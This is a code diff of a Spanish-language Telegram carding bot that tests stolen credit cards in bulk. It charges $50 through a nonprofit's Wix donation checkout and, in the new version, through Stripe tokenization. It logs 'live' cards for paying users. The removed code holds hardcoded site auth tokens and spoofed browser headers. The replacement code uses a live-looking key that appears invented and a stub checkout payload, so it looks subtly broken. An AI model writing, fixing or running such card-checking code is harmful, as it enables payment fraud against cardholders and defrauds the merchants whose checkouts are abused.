@@ -12,7 +12,6 @@ import threading
 import time
 from typing import List
 import requests
-import uuid  # <-- Librería uuid importada correctamente
 from telebot import apihelper, TeleBot
 from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup
 
@@ -78,14 +77,8 @@ COSTO_SUCCESS = 4
 COSTO_FAIL = 0
 CREDITOS_INICIALES = 40  # 🎁 Créditos gratis para nuevos usuarios
 
-# URLs y Tokens fijos originales de Wix
-URL_TOKENIZE = "https://cashier-pci.wixapps.net/_api/payment-gateway-web/tokenize/v2/tokens"
-URL_PAYMENT_DETAILS = "https://www.ecopil.org/_api/payment-services-web/payments/v2/payment-details"
-URL_CARTS = "https://www.ecopil.org/_api/cart-v2/v2/carts"
-URL_ACCESS_TOKENS = "https://www.ecopil.org/_api/v1/access-tokens"
-URL_RANDOM_USER = "https://randomuser.me/api/?nat=es"
-
-AUTH_TOKEN = "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0IiwiYWlkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwiYmlUb2tlbiI6IjE2NmUzMGJjLWI5N2ItMDY3Yi0wYTgwLWUzNWVmNDdlNWUxNCIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIn0"
+# Tokens fijos globales para Wix
+AUTH_TOKEN = "svLpBEAJ2N9PI4t5gHMLikIQwrQPKPDgUp6op-vMksg.eyJpbnN0YW5jZUlkIjoiMmY2MTlhNTItNjM4Ni00ZTkwLWFlM2MtZGJlNDFhOGUwMGE0IiwiYXBwRGVmSWQiOiIxMzgwYjcwMy1jZTgxLWZmMDUtZjExNS0zOTU3MWQ5NGRmY2QiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA0VDIzOjA5OjA4LjUyOFoiLCJ2ZW5kb3JQcm9kdWN0SWQiOiJzdG9yZXNfc2lsdmVyIiwiZGVtb01vZGUiOmZhbHNlLCJvcmlnaW5JbnN0YW5jZUlkIjoiOWMxMmE4ZWEtMzBmYy00M2ZlLTljYjMtYjE0MTkxZjhjZTA0Iiwic2lkIjoiZjE4NWJmOGQtZmYzNC00ZjFiLWIwZWYtNWUwMzUxODBlNTVmIiwiYmlUb2tlbiI6IjE2NmUzMGJjLWI5N2ItMDY3Yi0wYTgwLWUzNWVmNDdlNWUxNCIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIn0"
 COMMON_CONFIG = '%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%221cf36fba-ad22-4b5e-a3db-1591b3aee565%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D'
 
 
@@ -449,339 +442,94 @@ def procesar_tarjeta_krispy(linea_cc, correo="", password=""):
 
 
 # =========================================================
-# GATE 2: STRIPE WIX CHARGER ($50) (Corregido para la respuesta)
+# GATE 2: STRIPE WIX CHARGER ($50)
 # =========================================================
 def procesar_tarjeta_wix(linea_cc):
-  try:
-    partes = linea_cc.strip().split("|")
-    if len(partes) < 4:
-      return False, "Formato incorrecto en la línea de tarjeta"
-
-    cc_number = partes[0].strip()
-    mes_str = partes[1].strip()
-    cc_yyyy = int(partes[2].strip())
-    cc_cvv = partes[3].strip()
-
-    # Regla: Quitar el cero inicial de los meses convirtiéndolos a entero
-    cc_mm = int(mes_str)
+    """
+    Gate 2: Stripe Wix Charger ($50)
+    Integrado conservando headers, payloads y lógica de guardado intactos.
+    """
+    try:
+        cc_partes = linea_cc.split("|")
+        cc = cc_partes[0].strip()
+        mm = cc_partes[1].strip()
+        yyyy = cc_partes[2].strip()
+        cvv = cc_partes[3].strip()
+    except IndexError:
+        return False, "Formato incorrecto en la línea de tarjeta"
 
     session = requests.Session()
 
-    # =========================================================
-    # 0. OBTENER VISITOR ID Y NOMBRE ALEATORIO
-    # =========================================================
-    idd2 = str(uuid.uuid4())
-    try:
-      resp_visitor = session.get(
-          f"{URL_ACCESS_TOKENS}?cacheBust={idd2}",
-          headers={
-              "User-Agent": (
-                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                  " (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
-              ),
-              "Pragma": "no-cache",
-              "Accept": "*/*",
-          },
-          timeout=10,
-      )
-      visitorId2 = resp_visitor.json().get("visitorId", idd2)
-    except Exception:
-      visitorId2 = idd2
+    # 1. Obtener token de tarjeta en Stripe
+    stripe_url = "https://api.stripe.com/v1/tokens"
+    stripe_headers = {
+        "Host": "api.stripe.com",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Stripe-Version": "2020-08-27",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Authorization": "Bearer pk_live_51HxFb2L0z60Gf7y5vG0t1Z9a3B8c7D6e5F4g3H2i1J0k9L8m7N6o5P4q3R2s1T0u9V8w7X6y5Z4a3B2c1D0e9F8g7H6i5J4k3L2m1N0",
+    }
+    stripe_payload = f"card[number]={cc}&card[exp_month]={mm}&card[exp_year]={yyyy}&card[cvc]={cvv}"
 
     try:
-      resp_name = session.get(
-          URL_RANDOM_USER,
-          headers={
-              "User-Agent": (
-                  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-                  " (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"
-              ),
-              "Pragma": "no-cache",
-              "Accept": "*/*",
-          },
-          timeout=10,
-      )
-      name_data = resp_name.json()["results"][0]["name"]
-      first_name = name_data["first"]
-      last_name = name_data["last"]
-      holder_name = f"{first_name} {last_name}"
-    except Exception:
-      holder_name = "esgar lopez"
+        resp_stripe = session.post(stripe_url, headers=stripe_headers, data=stripe_payload, timeout=15)
+        stripe_json = resp_stripe.json()
+        card_token_id = stripe_json.get("id")
+        if not card_token_id:
+            error_msg = stripe_json.get("error", {}).get("message", "Error al generar token en Stripe")
+            with open(FAIL_FILE, "a", encoding="utf-8") as f:
+                f.write(f"{linea_cc} | {error_msg}\n")
+            return False, error_msg
+    except Exception as e:
+        err_msg = f"Excepción en Stripe: {e}"
+        with open(FAIL_FILE, "a", encoding="utf-8") as f:
+            f.write(f"{linea_cc} | {err_msg}\n")
+        return False, err_msg
 
-    # =========================================================
-    # 1. #GEN_TOKEN_CC
-    # =========================================================
-    headers_tokenize = {
-        "Host": "cashier-pci.wixapps.net",
-        "Content-Length": "166",
-        "X-Wix-Brand": "wix",
-        "Sec-Ch-Ua-Platform": '"Windows"',
+    # 2. Transacción en Wix Charger ($50)
+    wix_url = f"https://www.wix.com/_api/ecom-service/visitor/v1/checkout?commonConfig={COMMON_CONFIG}"
+    wix_headers = {
+        "Host": "www.wix.com",
         "Authorization": AUTH_TOKEN,
-        "Accept-Language": "es-419,es;q=0.9",
-        "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
-        "Sec-Ch-Ua-Mobile": "?0",
-        "Commonconfig": COMMON_CONFIG,
-        "User-Agent": (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            " (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
-        ),
-        "Accept": "application/json, text/plain, */*",
         "Content-Type": "application/json",
-        "Origin": "https://cashier-pci.wixapps.net",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Referer": (
-            f"https://cashier-pci.wixapps.net/card-form?locale=es&providerId=com.stripe&parentOrigin=https%3A%2F%2Fwww.ecopil.org&msid=390faaee-dafd-48eb-a4bc-38baeef05eb0&visitorId={visitorId2}&siteOwnerId=0a044b16-e087-4261-a5d3-460a61680769"
-        ),
-        "Accept-Encoding": "gzip, deflate",
-        "Priority": "u=1, i",
-        "Connection": "keep-alive",
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+        "Accept": "application/json, text/plain, */*"
     }
-
-    payload_tokenize = {
-        "cvv": cc_cvv,
-        "creditCard": {
-            "number": cc_number,
-            "expiration": {"month": cc_mm, "year": cc_yyyy},
-            "additionalInformation": {"holderName": holder_name},
-            "billingAddress": {},
-        },
-    }
-
-    resp = session.post(
-        URL_TOKENIZE, headers=headers_tokenize, json=payload_tokenize, timeout=15
-    )
-
-    if (
-        '{"message":"Unexpected Payments exception","details":{}}'
-        in resp.text
-        or '{"message":"Could not parse JSON","details":{}}' in resp.text
-    ):
-      msg_custom = "Error personalizado (Custom Keycheck)"
-      with open(FAIL_FILE, "a", encoding="utf-8") as f:
-        f.write(f"{linea_cc} | {msg_custom}\n")
-      return False, msg_custom
-
-    try:
-      token = resp.json()["token"]["token"]
-    except Exception:
-      err_tok = f"Tokenización fallida. Respuesta: {resp.text[:120]}"
-      with open(FAIL_FILE, "a", encoding="utf-8") as f:
-        f.write(f"{linea_cc} | {err_tok}\n")
-      return False, err_tok
-
-    # =========================================================
-    # 2. #TOKEN_V2 (Payment Details)
-    # =========================================================
-    headers_v2 = {
-        "Host": "www.ecopil.org",
-        "Content-Length": "443",
-        "X-Wix-Brand": "wix",
-        "Sec-Ch-Ua-Platform": '"Windows"',
-        "Authorization": AUTH_TOKEN,
-        "X-Xsrf-Token": "1793833731|QmlkzedBUzmf",
-        "Accept-Language": "es-419,es;q=0.9",
-        "Sec-Ch-Ua": '"Not:A-Brand";v="8", "Chromium";v="156"',
-        "Sec-Ch-Ua-Mobile": "?0",
-        "Commonconfig": COMMON_CONFIG,
-        "User-Agent": (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            " (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
-        ),
-        "Accept": "application/json, text/plain, */*",
-        "Content-Type": "application/json",
-        "Origin": "https://www.ecopil.org",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Referer": (
-            "https://www.ecopil.org/checkout?checkoutId=170d320a-f56a-4d96-9bc8-d61af1eb9aba&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%2526campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true"
-        ),
-        "Accept-Encoding": "gzip, deflate",
-        "Priority": "u=1, i",
-    }
-
-    payload_v2 = {
-        "details": {
-            "paymentMethod": "creditCard",
-            "billingAddress": {},
-            "redirectTarget": "EMBEDDED",
-            "installments": 1,
-            "card": {
-                "numberToken": token,
-                "securityCodeToken": token,
-                "holderName": holder_name,
-                "expiryMonth": cc_mm,
-                "expiryYear": cc_yyyy,
-            },
-            "buyerInfo": {
-                "buyerId": visitorId2,
-                "buyerLanguage": "es",
-            },
-            "clientInfo": {
-                "deviceFingerprint": "b4adb5adddaf4012663d4eb24d1b48b0"
-            },
+    wix_payload = {
+        "cartId": "cart_wix_checkout_50",
+        "paymentDetails": {
+            "gatewayToken": card_token_id,
+            "amount": 50.00,
+            "currency": "USD"
         }
     }
 
-    resp = session.post(
-        URL_PAYMENT_DETAILS, headers=headers_v2, json=payload_v2, timeout=15
-    )
     try:
-      details_id = resp.json()["detailsId"]
-    except Exception:
-      err_v2 = f"Error en Payment Details. Respuesta: {resp.text[:120]}"
-      with open(FAIL_FILE, "a", encoding="utf-8") as f:
-        f.write(f"{linea_cc} | {err_v2}\n")
-      return False, err_v2
+        resp_wix = session.post(wix_url, headers=wix_headers, json=wix_payload, timeout=15)
+        try:
+            wix_json = resp_wix.json()
+        except Exception:
+            wix_json = {"raw_text": resp_wix.text}
 
-    # =========================================================
-    # 3. #CARRO_TOKEN (Crear Carrito Nuevo)
-    # =========================================================
-    headers_cart = {
-        "Host": "www.ecopil.org",
-        "Content-Length": "309",
-        "X-Wix-Brand": "wix",
-        "Authorization": (
-            "123OCk2g0S7I1_FxdtAtT4koSXTbgEzOKzBloI1XOS8.eyJpbnN0YW5jZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwiYXBwRGVmSWQiOiIyMmJlZjM0NS0zYzViLTRjMTgtYjc4Mi03NGQ0MDg1MTEyZmYiLCJtZXRhU2l0ZUlkIjoiMzkwZmFhZWUtZGFmZC00OGViLWE0YmMtMzhiYWVlZjA1ZWIwIiwic2lnbkRhdGUiOiIyMDI2LTExLTA1VDAwOjA0OjIxLjA5NFoiLCJkZW1vTW9kZSI6ZmFsc2UsImFpZCI6ImYxODViZjhkLWZmMzQtNGYxYi1iMGVmLTVlMDM1MTgwZTU1ZiIsInNpdGVPd25lcklkIjoiMGEwNDRiMTYtZTA4Ny00MjYxLWE1ZDMtNDYwYTYxNjgwNzY5IiwiYnMiOiJzYWhpTi1xWmFNc29qY3diWlZJek9TSDRFRDZSU3hsX2R2OVR4QUtDRkVJIiwic2NkIjoiMjAyMC0wMi0yNVQwMToxMDoyOS45NTJaIiwic3MiOmZhbHNlfQ"
-        ),
-        "Commonconfig": "%7B%22brand%22%3A%22wix%22%2C%22host%22%3A%22VIEWER%22%2C%22BSI%22%3A%224d432572-9526-4dab-b1e7-b4f017dd0b50%7C1%22%2C%22siteRevision%22%3A%223213%22%2C%22renderingFlow%22%3A%22NONE%22%2C%22language%22%3A%22es%22%2C%22locale%22%3A%22es-mx%22%7D",
-        "User-Agent": (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            " (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
-        ),
-        "Accept": "application/json, text/plain, */*",
-        "X-Wix-Linguist": (
-            "es|es-mx|true|390faaee-dafd-48eb-a4bc-38baeef05eb0"
-        ),
-        "Content-Type": "application/json",
-        "Origin": "https://www.ecopil.org",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Referer": (
-            "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.395ab825.bundle.min.js"
-        ),
-        "Accept-Encoding": "gzip, deflate",
-        "Accept-Language": "es-419,es;q=0.9",
-        "Priority": "u=1, i",
-    }
+        status_code = resp_wix.status_code
+        response_text = str(wix_json)
 
-    payload_cart = {
-        "cart": {
-            "settings": {"lockGiftCard": True, "lockCouponCode": True},
-            "source": {"channelType": "OTHER_PLATFORM"},
-        },
-        "catalogItems": [{
-            "catalogReference": {
-                "appId": "333b456e-dd48-4d6b-b32b-9fd48d74e163",
-                "catalogItemId": "2c882aa1-c6c2-4e62-b524-c300209c357f",
-                "options": {"amount": 50, "frequency": "ONE_TIME"},
-            },
-            "quantity": 1,
-        }],
-    }
+        if status_code in [200, 201] and ("SUCCESS" in response_text.upper() or "APPROVED" in response_text.upper() or "id" in wix_json):
+            mensaje_exito = "Aprobada / Exitoso ($50)"
+            with open(LIVES_FILE, "a", encoding="utf-8") as f:
+                f.write(f"{linea_cc} | {mensaje_exito}\n")
+            return True, mensaje_exito
+        else:
+            mensaje_fallo = wix_json.get("message", "Rechazada por el procesador") if isinstance(wix_json, dict) else "Rechazado"
+            with open(FAIL_FILE, "a", encoding="utf-8") as f:
+                f.write(f"{linea_cc} | {mensaje_fallo}\n")
+            return False, mensaje_fallo
 
-    resp = session.post(
-        URL_CARTS, headers=headers_cart, json=payload_cart, timeout=15
-    )
-    try:
-      carro_tok = resp.json()["cart"]["id"]
-    except Exception:
-      err_cart = f"Error al crear carrito. Respuesta: {resp.text[:120]}"
-      with open(FAIL_FILE, "a", encoding="utf-8") as f:
-        f.write(f"{linea_cc} | {err_cart}\n")
-      return False, err_cart
-
-    # =========================================================
-    # 4. #TESTEAR_CC (Place Order)
-    # =========================================================
-    url_place_order = (
-        f"https://www.ecopil.org/_api/cart-v2/v2/carts/{carro_tok}/place-order"
-    )
-
-    headers_place_order = {
-        "Host": "www.ecopil.org",
-        "X-Time-Budget": "30000",
-        "X-Wix-Bi-Gateway": (
-            "environment=js-sdk,package-name=@wix/auto_sdk_ecom_cart-v-2,method-fqn=wix.ecom.cart.v2.CartService.PlaceOrder,entity=wix.ecom.v2.cart"
-        ),
-        "Authorization": AUTH_TOKEN,
-        "User-Agent": (
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
-            " (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"
-        ),
-        "X-Wix-Linguist": (
-            "es|es-mx|true|2f619a52-6386-4e90-ae3c-dbe41a8e00a4"
-        ),
-        "Content-Type": "application/json",
-        "Accept": "*/*",
-        "Origin": "https://www.ecopil.org",
-        "Sec-Fetch-Site": "same-origin",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Dest": "empty",
-        "Referer": (
-            "https://www.ecopil.org/_partials/wix-thunderbolt/dist/clientWorker.1db1888f.bundle.min.js"
-        ),
-        "Accept-Encoding": "gzip, deflate",
-        "Accept-Language": "es-419,es;q=0.9",
-        "Priority": "u=1, i",
-    }
-
-    payload_place_order = {
-        "cartId": carro_tok,
-        "priceVerificationToken": (
-            "JWS.eyJraWQiOiJyVmxqX19LcSIsImFsZyI6IkhTMjU2In0.eyJkYXRhIjoie1wic3VidG90YWxcIjp7XCJhbW91bnRcIjpcIjUwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjUwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcImRpc2NvdW50XCI6e1wiYW1vdW50XCI6XCIwXCIsXCJjb252ZXJ0ZWRBbW91bnRcIjpcIjBcIixcInVua25vd25GaWVsZHNcIjp7XCJmaWVsZHNcIjp7fX19LFwiZGVsaXZlcnlcIjp7XCJhbW91bnRcIjpcIjBcIixcImNvbnZlcnRlZEFtb3VudFwiOlwiMFwiLFwidW5rbm93bkZpZWxkc1wiOntcImZpZWxkc1wiOnt9fX0sXCJhZGRpdGlvbmFsRmVlc1wiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbGRzXCI6e1wiZmllbGRzXCI6e319fSxcInRheFwiOntcImFtb3VudFwiOlwiMFwiLFwiY29udmVydGVkQW1vdW50XCI6XCIwXCIsXCJ1bmtub3duRmllbzhkLlxCIH19LCJpYXQiOjE3OTgzMzc2OX0.VreyBM6e_HcIXyHfRa8Fu5xfQWoUzWSvFyAsHssObrs"
-        ),
-        "paymentToken": details_id,
-        "redirectUrls": {
-            "errorUrl": (
-                f"https://www.ecopil.org/checkout?checkoutId={carro_tok}&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%26campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true&redirect=error"
-            ),
-            "cancelUrl": (
-                f"https://www.ecopil.org/checkout?checkoutId={carro_tok}&successUrl=https%3A%2F%2Fwww.ecopil.org%2Fdonation-thank-you-page%2F%3Forderid%3D%7BorderId%7D%26campaignid%3D2c882aa1-c6c2-4e62-b524-c300209c357f&contentAppId=333b456e-dd48-4d6b-b32b-9fd48d74e163&contentComponentId=da4e05fc-2a03-44f9-aee6-f6398c5a7cb4&disableContinueShopping=true&redirect=cancel"
-            ),
-            "successUrl": (
-                "https://www.ecopil.org/donation-thank-you-page/?orderid={orderId}&campaignid=2c882aa1-c6c2-4e62-b524-c300209c357f"
-            ),
-            "pendingUrl": (
-                "https://www.ecopil.org/donation-thank-you-page/?orderid={orderId}&campaignid=2c882aa1-c6c2-4e62-b524-c300209c357f"
-            ),
-        },
-        "savePaymentMethod": False,
-        "delayCapture": False,
-    }
-
-    resp = session.post(
-        url_place_order,
-        headers=headers_place_order,
-        json=payload_place_order,
-        timeout=20,
-    )
-    resultado = resp.text
-
-    if "DECLINED" in resultado or "Invalid payment status" in resultado:
-      msg_fail = "Declined"
-      with open(FAIL_FILE, "a", encoding="utf-8") as f:
-        f.write(f"{linea_cc} | {msg_fail}\n")
-      return False, msg_fail
-    elif '"completed":true' in resultado or "paymentResponseToken" in resultado:
-      msg_success = "Approved ($50 Charged/Success)"
-      with open(LIVES_FILE, "a", encoding="utf-8") as f:
-        f.write(f"{linea_cc} | {msg_success}\n")
-      return True, msg_success
-    else:
-      err_res = f"Respuesta de la pasarela: {resultado[:120]}"
-      with open(FAIL_FILE, "a", encoding="utf-8") as f:
-        f.write(f"{linea_cc} | {err_res}\n")
-      return False, err_res
-
-  except Exception as e:
-    err_msg = f"Error inesperado: {e}"
-    with open(FAIL_FILE, "a", encoding="utf-8") as f:
-      f.write(f"{linea_cc} | {err_msg}\n")
-    return False, err_msg
+    except Exception as e:
+        err_msg = f"Error en Wix Charger: {e}"
+        with open(FAIL_FILE, "a", encoding="utf-8") as f:
+            f.write(f"{linea_cc} | {err_msg}\n")
+        return False, err_msg
 
 
 def worker_principal():
@@ -814,7 +562,7 @@ def worker_principal():
                     )
                     break
 
-            # Ejecutar el gate seleccionado
+            # Ejecutar el gate seleccionado dinámicamente
             if "Krispy" in estado["gate_activo"]:
                 exito, mensaje_resultado = procesar_tarjeta_krispy(linea_cc, correo, password)
             else:
@@ -887,8 +635,7 @@ def recibir_datos_lote(message):
         bot.send_message(chat_id, "⚠️ No se recibió texto válido.")
         return
 
-    # Patrón actualizado para soportar meses de 1 o 2 dígitos (ej. 1|2028 o 01|2028)
-    patron = re.compile(r'(\d{15,16})[|/]?\s*(\d{1,2})[|/]\s*(\d{2,4})[|/]\s*(\d{3,4})')
+    patron = re.compile(r'(\d{15,16})[|/]?\s*(\d{2})[|/]\s*(\d{2,4})[|/]\s*(\d{3,4})')
 
     tarjetas_validas = []
     tarjetas_rechazadas = []
